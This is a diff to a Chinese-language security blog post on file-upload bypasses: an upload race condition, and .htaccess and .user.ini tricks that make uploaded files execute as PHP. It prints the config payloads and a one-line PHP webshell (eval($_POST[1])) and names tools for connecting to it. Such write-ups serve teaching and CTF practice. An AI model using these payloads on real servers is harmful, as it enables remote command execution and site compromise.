+<li>⽂件移动：代码先使⽤ move_uploaded_file 函数将上传的临时⽂件移动到⽬标⽬录，此时⽂件已经被放置在⽬ 标⽬录中，但还未进⾏⽂件类型检查</li>
+<li>时间间隔：在⽂件移动完成后，代码才开始检查⽂件扩展名是否合法。在这个时间间隔内，攻击者可以利⽤多线 程或脚本快速地多次上传⽂件，并且在服务器进⾏⽂件类型检查之前，修改服务器上⽂件的扩展名或内容 </li>
+<li>绕过检查：如果攻击者在⽂件类型检查之前将⽂件扩展名修改为合法的扩展名，或者利⽤⽂件包含访问图⽚⻢等⽅式让服务器以恶意代码的形式执⾏⽂件，就可以绕过⽂件类型检查，实现恶意⽂件的上传和执⾏，所以可以利⽤ bp 的 Intruder 不断的发送请求，然后去访问上传的⽂件位置，可能会访问到</li>
+</ul>
+<h1 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h1><h2 id="htaccess文件"><a href="#htaccess文件" class="headerlink" title=".htaccess文件"></a>.htaccess文件</h2><p><code>利用条件</code>：Apache环境下可利用</p>
+<p>Apache中的一个配置文件，中间件是Apache才能用</p>
+<p>可以实现 网页301重定向、自定义404错误页面，改变文件扩展名、允许&#x2F;阻止特定的用户或者目录的访问，禁止目录列表，配置默认文档等功能  </p>
+<h3 id="利用htaccess文件getshell"><a href="#利用htaccess文件getshell" class="headerlink" title="利用htaccess文件getshell"></a>利用htaccess文件getshell</h3><h4 id="分析源码"><a href="#分析源码" class="headerlink" title="分析源码"></a>分析源码</h4><p>如果对php，asp，jsp等进行过滤，大小写的方式也不行，但是可以上传.jpg文件，可是 .jpg只有解析成 php文件才能getshell</p>
+<p>因此我们需要先上传 .htaccess 文件，然后再上传 .jpg文件</p>
+<h4 id="创建-htaccess文件"><a href="#创建-htaccess文件" class="headerlink" title="创建.htaccess文件"></a>创建.htaccess文件</h4><p>在本地（记事本就行）创建一个.htaccess文件</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-section">&lt;FileMatch<span class="hljs-string">&quot;\文件名&quot;</span>&gt;</span><br><br><span class="hljs-attribute">SetHandler</span> application/x-httpd-php<br><br><span class="hljs-section">&lt;/FilesMatch&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>这个代码是将题目要求的文件类型被解析为PHP文件</p>
+<h4 id="上传-htaccess文件"><a href="#上传-htaccess文件" class="headerlink" title="上传.htaccess文件"></a>上传.htaccess文件</h4><h4 id="上传一句话木马"><a href="#上传一句话木马" class="headerlink" title="上传一句话木马"></a>上传一句话木马</h4><p>利用bp抓包上传一句话木马，这里要注意的是文件名称必须和.htaccess中的文件名相同</p>
+<h4 id="访问"><a href="#访问" class="headerlink" title="访问"></a>访问</h4><p>获取绝对路径返回网站访问，可以蚁剑链接也可以用hackbar执行命令</p>
+<h2 id="user-ini文件"><a href="#user-ini文件" class="headerlink" title=".user.ini文件"></a>.user.ini文件</h2><p><code>利用条件</code>：上传目录下必须有一个可执行的php文件</p>
+<p><code>php.ini</code>是 PHP 的一个全局配置文件，对整个 Web 服务器起作用，而<code>.user.ini</code>和<code>.htaccess</code>文件都可以看作是用户自定义的<code>php.ini</code>，其中<code>.user.ini</code>比<code>.htaccess</code>用的更广，不管是<code>nginx</code>、<code>apache</code>、<code>IIS</code>，只要是以<code>fastcgi</code>运行的 PHP 都可以用这个方法，但也有局限性，<code>就是上传文件的目录下一定要有一个可执行的 PHP 文件</code></p>
+<h3 id="直接使用"><a href="#直接使用" class="headerlink" title="直接使用"></a>直接使用</h3><p>如果黑名单没有限制.user.ini</p>
+<p>先上传一个.user.ini文件，文件内容是包含一个1.txt</p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">auto_append_file</span>=<span class="hljs-number">123</span>.txt<br></code></pre></td></tr></table></figure>
+
+<p>然后上传123.txt</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-number">1</span>]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>然后访问index.php即可，POST传参输入命令</p>
+<h3 id="搭配协议使用"><a href="#搭配协议使用" class="headerlink" title="搭配协议使用"></a>搭配协议使用</h3><p>同样按上述步骤可以上传但不能解析时，就想到可以包含伪协议的，只要环境支持伪协议</p>
+<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-built_in">auto</span>_append_file=php:<span class="hljs-comment">//input</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/2026/01/24/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20260131001247522.png" srcset="/img/loading.gif" lazyload alt="image-20260131001247522"></p>
+
                 
               </div>
             
@@ -491,7 +707,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>更新于</div>
-          <div>2026年1月24日</div>
+          <div>2026年1月31日</div>
         </div>
       
       
